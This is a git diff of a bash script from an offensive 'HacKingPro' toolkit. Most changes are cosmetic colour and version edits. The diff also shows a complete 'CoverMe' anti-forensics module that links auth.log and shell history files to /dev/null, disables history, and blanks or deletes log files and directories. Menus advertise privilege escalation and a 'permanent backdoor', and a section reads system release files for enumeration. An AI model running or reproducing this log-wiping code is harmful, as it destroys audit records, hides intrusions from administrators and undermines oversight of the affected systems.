@@ -18,7 +18,7 @@
 #                                                             #
 #-Metadata----------------------------------------------------#
 #                                                             #
-#  Filename: HacKingPro                  (Update: 03-08-2022) #
+#  Filename: HacKingPro                  (Update: 08-08-2022) #
 #  Source: https://github.com/Anlominus/HacKingPro            #
 #                                                             #
 #-Info--------------------------------------------------------#
@@ -36,11 +36,14 @@
 #     Tested on: MacOS                                        #
 #                                                             #
 #-Notes-------------------------------------------------------#
-# - Run as root                                               #
-# - complete section 1                                        #
+# - 1] Run as root
+# - 2] complete section
+# - 3] Implement Anonymous Installer [*]
 #                             ---                             #
 #                                                             #
 ###############################################################
+
+
 if [ ${1} == "-d" ]; then
   #statements
   if [ -z ${2} ]; then
@@ -67,7 +70,6 @@ if [ ! -z "$targetDns" ]; then
 fi
 
 ###############################################
-
 clear
 chmod +x *
 chmod +rwx */*/*/*/*
@@ -90,10 +92,10 @@ about() {
                     .',..           .,,.
                     .'.              ..,.
                     .                  .'
-                   ..   $green  Aภl๏miภuຮ $purple   .
+                   ..   ${BGreen}  Aภl๏miภuຮ $purple   .
                    ..                   .
                    ..                  ...
-            ....''''.   $blue HacKingPro$purple    .','''....
+            ....''''.   ${BBlue} HacKingPro$purple    .','''....
           .',,,,,,,,'..               ..',,,,,,,,'.
          ...'',,,,,,,'...          ....',,,,,,,,'...
         ....'',;;;;;;;,,'''......'''',,;;;;;;;,'''...
@@ -113,9 +115,9 @@ about() {
     ${DGrey}┣──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}Written by ${BCyan}Leon Yaakobov ${Color_Off}For Showing Skills ${BRed}]
     ${DGrey}┗──⇢ ${BRed}[${LRed} ${HacKingPro} ${Color_Off}Tool for ${BRed}Red Teams ${BBlue} Blue Teams ${BRed}]
 
-    ${DGrey}┌──${BRed}[${DGrey} AnyTool ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Many Systems HacKing Tools Downloader ${HacKingPro} ${BRed}]
+    ${DGrey}┌──${BRed}[${DGrey} AnyTool ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Many Systems HacKing Tools Downloader ${HacKingPro} ${BRed}]
     ${DGrey}|
-    ${DGrey}└──${BRed}[${DGrey} About ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Information About The ${HacKingPro} Tool ${BRed}]
+    ${DGrey}└──${BRed}[${DGrey} About ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Information About The ${HacKingPro} Tool ${BRed}]
 
     ${DGrey}┏==⥤ ${Color_Off}[${LRed} ❌ ❗ Warning ❗ ❌ ${Color_Off}]
     ${DGrey}|
@@ -244,24 +246,24 @@ HacKingProColors
 # ♥️ ✯ 🔞 🗨 👩‍ 💻 😜 😡
 # 💥 ☣ ✍ █ ▓ ░ ▒ 💿 🎧 📸
 # 👤
-cEye="$green 👁 $cyan"
+cEye="${BGreen} 👁 $cyan"
 cWall="$purple[$purple░$purple]$cyan"
-cDock="$purple[$green📌$purple]$cyan"
-cPassKey="$purple[$green🔐$purple]$cyan"
-cAnlominus="$purple[$green👽$purple]$cyan"
-cAlien="$purple[$green🙏$purple]$cyan"
-cGlasses="$purple[$green👓$purple]$yellow"
-cLock="$red[$yellow🔒$red]$grey"
-cInvalid="$red[$yellow🚫$red]$red"
-cKey="$red[$yellow🔑$red]$yellow"
-cLink="$red[$orange🔗$red]$orange"
-cSharp="$red[$yellow#$red]$blue"
-cWhat="$red[$yellow?$red]$cyan"
-cInfo="$red[$yellow!$red]$blue"
-cPlus="$red[$green+$red]$white"
-cDone="$red[$green✔$red]$green"
-cFalse="$yellow[$red✘$yellow]$red"
-cDanger="$yellow ⚠️ $red"
+cDock="$purple[${BGreen}📌$purple]$cyan"
+cPassKey="$purple[${BGreen}🔐$purple]$cyan"
+cAnlominus="$purple[${BGreen}👽$purple]$cyan"
+cAlien="$purple[${BGreen}🙏$purple]$cyan"
+cGlasses="$purple[${BGreen}👓$purple]$yellow"
+cLock="${BRed}[$yellow🔒${BRed}]$grey"
+cInvalid="${BRed}[$yellow🚫${BRed}]${BRed}"
+cKey="${BRed}[$yellow🔑${BRed}]$yellow"
+cLink="${BRed}[$orange🔗${BRed}]$orange"
+cSharp="${BRed}[$yellow#${BRed}]${BBlue}"
+cWhat="${BRed}[$yellow?${BRed}]$cyan"
+cInfo="${BRed}[$yellow!${BRed}]${BBlue}"
+cPlus="${BRed}[${BGreen}+${BRed}]$white"
+cDone="${BRed}[${BGreen}✔${BRed}]${BGreen}"
+cFalse="$yellow[${BRed}✘$yellow]${BRed}"
+cDanger="$yellow ⚠️ ${BRed}"
 # |
 
 
@@ -295,11 +297,11 @@ lahs(){
 #         HacKingPro Variables          #
 #########################################
 
-LastUPDATE="2022 August 4"
+LastUPDATE="2022 August 8"
 ToolSource="https://github.com/AnLoMinus/HacKingPro"
 HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro$resetT")
 Anlominus=$(echo "${BGreen}An${DGrey}Lo${BRed}Minus")
-MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}24")
+MyVersion=$(echo "${DGrey}V0.0.0.${BWhite}25")
 HacKingProDavid=$(echo "\n\t  ${BRed}[${BCyan}✡${BRed}] ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 HacKingProExit=$(echo "\n ${BRed}[${BCyan}✡${BRed}] ${BCyan}Exit ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 Press_ENTER=$(echo "\n\n${BYellow}                🔶    Press ENTER    🔶     ${BGreen}\n\n")
@@ -388,196 +390,177 @@ CoverMe(){
 
   # CoverMyAss Cleaning Logs
 
-    MainMenu () {
-      isRoot () {
-              if [ "$EUID" -ne 0 ]; then
-                      return 1
-              fi
-      }
+  isRoot () {
+    if [ "$EUID" -ne 0 ]; then
+      return 1
+    fi
+  }
 
-      disableAuth () {
-        if [ -w /var/log/auth.log ]; then
-          ln /dev/null /var/log/auth.log -sf
+  disableAuth () {
+    if [ -w /var/log/auth.log ]; then
+      ln /dev/null /var/log/auth.log -sf
+      echo " "
+      echo "[+] Permanently sending /var/log/auth.log to /dev/null"
+      read -p "$Press_ENTER"
+    else
+      echo " "
+      echo "[!] /var/log/auth.log is not writable! Retry using sudo."
+      read -p "$Press_ENTER"
+    fi
+  }
+
+  disableHistory () {
+    ln /dev/null ~/.bash_history -sf
+    echo " "
+    echo "[+] Permanently sending bash_history to /dev/null"
+    read -p "$Press_ENTER"
+
+    if [ -f ~/.zsh_history ]; then
+      ln /dev/null ~/.zsh_history -sf
+      echo " "
+      echo "[+] Permanently sending zsh_history to /dev/null"
+      read -p "$Press_ENTER"
+    fi
+    export HISTFILESIZE=0
+    export HISTSIZE=0
+    echo " "
+    echo "[+] Set HISTFILESIZE & HISTSIZE to 0"
+    echo " "
+    set +o history
+    echo "[+] Disabled history library"
+    echo "Permenently disabled bash log."
+    read -p "$Press_ENTER"
+  }
+
+  enableAuth () {
+    if [ -w /var/log/auth.log ] && [ -L /var/log/auth.log ]; then
+      rm -rf /var/log/auth.log
+      echo " "
+      echo " " > /var/log/auth.log
+      echo "[+] Disabled sending auth logs to /dev/null"
+      read -p "$Press_ENTER"
+    else
+      echo " "
+      echo "[!] /var/log/auth.log is not writable! Retry using sudo."
+      read -p "$Press_ENTER"
+    fi
+  }
+
+  enableHistory () {
+    if [ -L ~/.bash_history ]; then
+      echo " "
+      rm -rf ~/.bash_history
+      echo "" > ~/.bash_history
+      echo "[+] Disabled sending history to /dev/null"
+    fi
+
+    if [ -L ~/.zsh_history ]; then
+      echo " "
+      rm -rf ~/.zsh_history
+      echo "" > ~/.zsh_history
+      echo "[+] Disabled sending zsh history to /dev/null"
+    fi
+
+    export HISTFILESIZE=" "
+    export HISTSIZE=50000
+    echo "
+    ${BWhite}|
+    ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} Restore HISTFILESIZE & HISTSIZE default values. ${BRed}]
+    ${BWhite}|
+    ${BWhite}|
+    ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} Enabled history library. ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Permenently enabled bash log. ${BRed}]
+    ${BWhite}|        "
+    echo " "
+    set -o history
+    echo " "
+  }
+
+  clearLogs () {
+    for i in "${LOGS_FILES[@]}"
+    do
+      if [ -f "$i" ]; then
+        if [ -w "$i" ]; then
+          read -p "$Press_ENTER"
+          echo " " > "$i"
           echo " "
-          echo "[+] Permanently sending /var/log/auth.log to /dev/null"
+          echo "        ${BWhite}|
+          ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Cleaned. ${BRed}]
+          ${BWhite}|              "
           read -p "$Press_ENTER"
         else
           echo " "
-          echo "[!] /var/log/auth.log is not writable! Retry using sudo."
-          read -p "$Press_ENTER"
-        fi
-      }
-
-      disableHistory () {
-        ln /dev/null ~/.bash_history -sf
-        echo " "
-        echo "[+] Permanently sending bash_history to /dev/null"
-        read -p "$Press_ENTER"
-
-        if [ -f ~/.zsh_history ]; then
-          ln /dev/null ~/.zsh_history -sf
-          echo " "
-          echo "[+] Permanently sending zsh_history to /dev/null"
-          read -p "$Press_ENTER"
-        fi
-        export HISTFILESIZE=0
-        export HISTSIZE=0
-        echo " "
-        echo "[+] Set HISTFILESIZE & HISTSIZE to 0"
-        echo " "
-        set +o history
-        echo "[+] Disabled history library"
-        echo "Permenently disabled bash log."
-        read -p "$Press_ENTER"
-                  }
-
-      enableAuth () {
-        if [ -w /var/log/auth.log ] && [ -L /var/log/auth.log ]; then
-          rm -rf /var/log/auth.log
-          echo " "
-          echo " " > /var/log/auth.log
-          echo "[+] Disabled sending auth logs to /dev/null"
-          read -p "$Press_ENTER"
-        else
-          echo " "
-          echo "[!] /var/log/auth.log is not writable! Retry using sudo."
-          read -p "$Press_ENTER"
-        fi
-      }
-
-      enableHistory () {
-        if [ -L ~/.bash_history ]; then
-          echo " "
-          rm -rf ~/.bash_history
-          echo "" > ~/.bash_history
-          echo "[+] Disabled sending history to /dev/null"
-        fi
-
-        if [ -L ~/.zsh_history ]; then
-          echo " "
-          rm -rf ~/.zsh_history
-          echo "" > ~/.zsh_history
-          echo "[+] Disabled sending zsh history to /dev/null"
-        fi
-
-        export HISTFILESIZE=" "
-        export HISTSIZE=50000
-        echo "
-      ${BWhite}|
-      ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} Restore HISTFILESIZE & HISTSIZE default values. ${BRed}]
-      ${BWhite}|
-      ${BWhite}|
-      ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} Enabled history library. ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Permenently enabled bash log. ${BRed}]
-      ${BWhite}|        "
-        echo " "
-        set -o history
-        echo " "
-      }
-
-      clearLogs () {
-        for i in "${LOGS_FILES[@]}"
-        do
-          if [ -f "$i" ]; then
-            if [ -w "$i" ]; then
-              read -p "$Press_ENTER"
-              echo " " > "$i"
-              echo " "
-              echo "        ${BWhite}|
-        ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Cleaned. ${BRed}]
-        ${BWhite}|              "
-              read -p "$Press_ENTER"
-            else
-              echo " "
-              echo "
-        ${BWhite}|
-        ${BWhite}|──${BRed}[${BGreen} ! ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Is Not Writable! Retry Using sudo. ${BRed}]
-        ${BWhite}|              "
-
-            fi
-          elif [ -d "$i" ]; then
-            if [ -w "$i" ]; then
-              rm -rf "${i:?}"/*
-              echo " "
-              echo "
-        ${BWhite}|
-        ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Cleaned. ${BRed}]
-        ${BWhite}|              "
-              read -p "$Press_ENTER"
-            else
-              echo "
-        ${BWhite}|
-        ${BWhite}|──${BRed}[${BGreen} !! ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Is Not Writable! Retry Using sudo. ${BRed}]
-        ${BWhite}|              "
-            fi
-          fi
-        done
-      }
-
-      clearHistory () {
-        if [ -f ~/.zsh_history ]; then
-          echo " "
-          echo " " > ~/.zsh_history
           echo "
-        ${BWhite}|
-        ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} ~/.zsh_history Cleaned. ${BRed}]
-        ${BWhite}|          "
-          read -p "$Press_ENTER"
+          ${BWhite}|
+          ${BWhite}|──${BRed}[${BGreen} ! ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Is Not Writable! Retry Using sudo. ${BRed}]
+          ${BWhite}|              "
+
         fi
-        echo " "
-        echo " " > ~/.bash_history
-        echo "
-        ${BWhite}|
-        ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} ~/.bash_history Cleaned. ${BRed}]
-        ${BWhite}|        "
-        read -p "$Press_ENTER"
+      elif [ -d "$i" ]; then
+        if [ -w "$i" ]; then
+          rm -rf "${i:?}"/*
+          echo " "
+          echo "
+          ${BWhite}|
+          ${BWhite}|──${BRed}[${BGreen} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Cleaned. ${BRed}]
+          ${BWhite}|              "
+          read -p "$Press_ENTER"
+        else
+          echo "
+          ${BWhite}|
+          ${BWhite}|──${BRed}[${BGreen} !! ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} $i Is Not Writable! Retry Using sudo. ${BRed}]
+          ${BWhite}|              "
+        fi
+      fi
+    done
+  }
 
-        echo " "
-        history -c
-        read -p "$Press_ENTER"
-        echo "
-        ${BWhite}|
-        ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen}  History File Deleted. ${BRed}]
-        ${BWhite}|        "
+  clearHistory () {
+    if [ -f ~/.zsh_history ]; then
+      echo " "
+      echo " " > ~/.zsh_history
+      echo "
+      ${BWhite}|
+      ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} ~/.zsh_history Cleaned. ${BRed}]
+      ${BWhite}|          "
+      read -p "$Press_ENTER"
+    fi
+    echo " "
+    echo " " > ~/.bash_history
+    echo "
+    ${BWhite}|
+    ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen} ~/.bash_history Cleaned. ${BRed}]
+    ${BWhite}|        "
+    read -p "$Press_ENTER"
 
-        echo " "
-        echo "
-        ${BWhite}|
-        ${BWhite}|──${BRed}[${BYellow} Reminder ${BRed}]${BWhite}──╼ ${BRed}[${BYellow} your need to reload the session to see effects. Type exit to do so.${BRed}]
-        ${BWhite}|        "
-        read -p "$Press_ENTER"
-      }
+    echo " "
+    history -c
+    read -p "$Press_ENTER"
+    echo "
+    ${BWhite}|
+    ${BWhite}|──${BRed}[${DGrey} + ${BRed}]${BWhite}──╼ ${BRed}[${BGreen}  History File Deleted. ${BRed}]
+    ${BWhite}|        "
 
-      exitTool () {
-              exit 1
-      }
+    echo " "
+    echo "
+    ${BWhite}|
+    ${BWhite}|──${BRed}[${BYellow} Reminder ${BRed}]${BWhite}──╼ ${BRed}[${BYellow} your need to reload the session to see effects. Type exit to do so.${BRed}]
+    ${BWhite}|        "
+    read -p "$Press_ENTER"
+  }
+
+  exitTool () {
+    exit 1
+  }
+  MainMenu () {
 
       clear # Clear output
 
       while true; do
         #statements
         clear
-        # HacKingProLogo1
-        HacKingProTargetStatus=$(echo "
-    ${ToolHeader}
-
-    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
-    ${DGrey}|
-    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
-    ${DGrey}|
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetName)${BRed}]${DGrey}──╼  ${LRed}Name${BBlue}: ${BGreen}${targetNAME}
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
-    ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
-    ${DGrey}|
-    ${DGrey}└──${BRed}[${DGrey} CL ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Cleaning Target Variables ${BRed}]
-
-            ")
-
-    HacKingProMenuMain=$(echo "${BRed}"
-    echo "$HacKingProTargetStatus""
+        ToolHeaderRun
+        TargetStatusRun
+    HacKingProMenuMain=$(echo "${BRed}
     ${DGrey}┌──${BRed}[${BYellow} Cover Me ${BRed}]
     ${DGrey}|
     ${DGrey}|──${BRed}[${DGrey} 01 ${BRed}]${BGreen}── ${BRed}[${DGrey} Clear logs for user ${BRed}$USER ${BRed}]
@@ -586,11 +569,11 @@ CoverMe(){
     ${DGrey}|
     ${DGrey}└──${BRed}[${DGrey} X ${BRed}] 🤴 Exit / Quit / Close
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Anonimity ${BRed}]${BGreen}──╼  ${BRed}[${BGreen} Cover Me ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Anonimity ${BRed}]${BYellow}╼▰   ${BRed}[${BGreen} Cover Me ${BRed}]${BYellow}╼▰  ${BGreen}   ")
             read -p "$HacKingProMenuMain" cmd
             case $cmd in
               1|01 )
@@ -622,30 +605,30 @@ CoverMe(){
 
     # "now" option
     if [ -n "$1" ] && [ "$1" == 'now' ]; then
-            clearLogs
-            clearHistory
-            exit 0
+      clearLogs
+      clearHistory
+      read "${Press_ENTER}  now"
+      exit 0
     fi
-
     MainMenu
+    if [[ $option == 1 ]]; then
+      # Clear logs & current history
+      clearLogs
+      clearHistory
 
-    if [ $option == 1 ]; then
-            # Clear logs & current history
-            clearLogs
-            clearHistory
-    elif [ $option == 2 ]; then
-            # Permenently disable auth & bash log
-            disableAuth
-            disableHistory
-    elif [ $option == 3 ]; then
-            # Restore default settings
-            enableAuth
-            enableHistory
-    elif [ $option == 99 ]; then
-            # Exit tool
-            exitTool
+    elif [[ $option == 2 ]]; then
+      # Permenently disable auth & bash log
+      disableAuth
+      disableHistory
+    elif [[ $option == 3 ]]; then
+      # Restore default settings
+      enableAuth
+      enableHistory
+    elif [[ $option == 99 ]]; then
+      # Exit tool
+      exitTool
     else
-            echo "[!] Option not reconized. Exiting."
+      echo " "
     fi
 }
 
@@ -1252,11 +1235,11 @@ Checking_IP_Target(){
     echo "
     ${ToolHeader}
 
-    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
+    ${DGrey}┌──${BRed}[${DGrey} P ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ⚡️ Planning and Scoping 🎯 ${BRed}]
     ${DGrey}|
-    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} $(date) ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
-    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} ${StartingTime} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Full Time ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} $(date) ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Current Date ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ${CurrentDate} ${BRed}]
+    ${DGrey}|──${BRed}[${DGrey} Starting Time ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} ${StartingTime} ${BRed}]
     ${DGrey}|
     ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetIP)${BRed}]${DGrey}──╼  ${LRed}IP${BBlue}: ${BGreen}${targetIP}
     ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetDns)${BRed}]${DGrey}──╼  ${LRed}Dns${BBlue}: ${BGreen}${targetDns}
@@ -1264,7 +1247,7 @@ Checking_IP_Target(){
     ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetEmail)${BRed}]${DGrey}──╼  ${LRed}Email${BBlue}: ${BGreen}${targetEmail}
     ${DGrey}|──${BRed}[ 🎯 ]${DGrey}──${BRed}[${DGrey}$(FunTargetPhone)${BRed}]${DGrey}──╼  ${LRed}Phone${BBlue}: ${BGreen}${targetPhone}
     ${DGrey}|
-    ${DGrey}└──${BRed}[${DGrey} CL ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Cleaning Target Variables ${BRed}] "
+    ${DGrey}└──${BRed}[${DGrey} CL ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Cleaning Target Variables ${BRed}] "
 
     echo "\n    ${BGreen}[${BRed} ERROR ${BGreen}]${BRed}──╼ ${BGreen}[ ❌ ]${BRed}──╼  ${BGreen}[${BRed} You need Enter IP Before Scanning ${BGreen}] \n"
     sleep 1
@@ -1534,20 +1517,20 @@ Privileg_Escalation(){
     ${DGrey}${faintT}  |──╼ ${resetT}${BRed}[${DGrey}${faintT} Persist easily between reboots ${resetT}${BRed}]
     ${DGrey}${faintT}  └──╼ ${resetT}${BRed}[${DGrey}${faintT} Insert a permanent bacdoor ${resetT}${BRed}]
 
-    ${DGrey}${faintT}┌╼ ${resetT}${BRed}[${BCyan} WinPrivPro ${BRed}]${BGreen}──╼ ${BRed}[${BCyan}${faintT} Windows Privilege Proffesional ${resetT}${BRed}]
-    ${DGrey}${faintT}┖───╼ ${resetT}${BRed}[${BCyan} WPP ${BRed}]${BGreen}──╼ ${BRed}[${BCyan}${faintT} WinPrivPro ${resetT}${BRed}]
+    ${DGrey}${faintT}┌╼ ${resetT}${BRed}[${BCyan} WinPrivPro ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan}${faintT} Windows Privilege Proffesional ${resetT}${BRed}]
+    ${DGrey}${faintT}┖───╼ ${resetT}${BRed}[${BCyan} WPP ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan}${faintT} WinPrivPro ${resetT}${BRed}]
 
-    ${DGrey}${faintT}┌╼ ${resetT}${BRed}[${ORANGE} LinPrivPro ${BRed}]${BGreen}──╼ ${BRed}[${ORANGE}${faintT} Linux Privilege Proffesional ${resetT}${BRed}]
-    ${DGrey}${faintT}┖─┲─╼ ${resetT}${BRed}[${ORANGE} LPP ${BRed}]${BGreen}──╼ ${BRed}[${ORANGE}${faintT} LinPrivPro ${resetT}${BRed}]
-    ${DGrey}${faintT}  ┖─╼ ${resetT}${BRed}[${ORANGE} FLP ${BRed}]${BGreen}──╼ ${BRed}[${ORANGE}${faintT} FunLinPEAS ${resetT}${BRed}]
+    ${DGrey}${faintT}┌╼ ${resetT}${BRed}[${ORANGE} LinPrivPro ${BRed}]${BYellow}╼▰  ${BRed}[${ORANGE}${faintT} Linux Privilege Proffesional ${resetT}${BRed}]
+    ${DGrey}${faintT}┖─┲─╼ ${resetT}${BRed}[${ORANGE} LPP ${BRed}]${BYellow}╼▰  ${BRed}[${ORANGE}${faintT} LinPrivPro ${resetT}${BRed}]
+    ${DGrey}${faintT}  ┖─╼ ${resetT}${BRed}[${ORANGE} FLP ${BRed}]${BYellow}╼▰  ${BRed}[${ORANGE}${faintT} FunLinPEAS ${resetT}${BRed}]
 
     ${DGrey}${faintT}─╼ ${resetT}${resetT}${BRed}[${DGrey} X ${BRed}]${BYellow}${faintT}──╼ ${resetT}${BRed}[${DGrey} Exit / Quit / Close ${BRed}]
 
-    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}──╼ ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Command ${BRed}]${BGreen}──╼ ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
+    ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BGreen}──╼ ${BRed}[${BGreen} Privilege Escalation ${BRed}]${BGreen}──╼ ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Privilege Escalation ${BRed}]${BYellow}╼▰  ${BGreen}   ")
 
     read -p "$HacKingProMenuMain" cmd
     case $cmd in
@@ -1682,25 +1665,25 @@ LinPrivPro(){
 
     ${DGrey}┌───────╼ ${BRed}[${BYellow} (Linux) Privilege Escalation ${BRed}]
     ${DGrey}|
-    ${DGrey}|──╼ ${BRed}[${ORANGE} Collect  ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Enumeration, more enumeration and some more enumeration. ${BRed}]
-    ${DGrey}|──╼ ${BRed}[${ORANGE} Process  ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Sort through data, analyse and prioritisation. ${BRed}]
-    ${DGrey}|──╼ ${BRed}[${ORANGE} Search  ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Know what to search for and where to find the exploit code. ${BRed}]
-    ${DGrey}|──╼ ${BRed}[${ORANGE} Adapt  ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Customize the exploit, so it fits. Not every exploit work for every system "out of the box". ${BRed}]
-    ${DGrey}|──╼ ${BRed}[${ORANGE} Try  ${BRed}]${BGreen}──╼ ${BRed}[${DGrey} Get ready for (lots of) trial and error. ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${ORANGE} Collect  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Enumeration, more enumeration and some more enumeration. ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${ORANGE} Process  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Sort through data, analyse and prioritisation. ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${ORANGE} Search  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Know what to search for and where to find the exploit code. ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${ORANGE} Adapt  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Customize the exploit, so it fits. Not every exploit work for every system "out of the box". ${BRed}]
+    ${DGrey}|──╼ ${BRed}[${ORANGE} Try  ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Get ready for (lots of) trial and error. ${BRed}]
     ${DGrey}|
     ${DGrey}└──╼"
 
     echo "
     ${DGrey}┌───────╼ ${BRed}[${BYellow} Operating System ${BRed}]
     ${DGrey}|
-    ${DGrey}|──╼ ${BRed}[${ORANGE} What's the distribution type? What version? ${BRed}]${BGreen}──╼"
+    ${DGrey}|──╼ ${BRed}[${ORANGE} What's the distribution type? What version? ${BRed}]${BYellow}╼▰ "
 
     cat /etc/issue
     cat /etc/*-release
     cat /etc/lsb-release
     cat /etc/redhat-release
 
-    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What's the Kernel version? Is it 64-bit? ${BRed}]${BGreen}──╼"
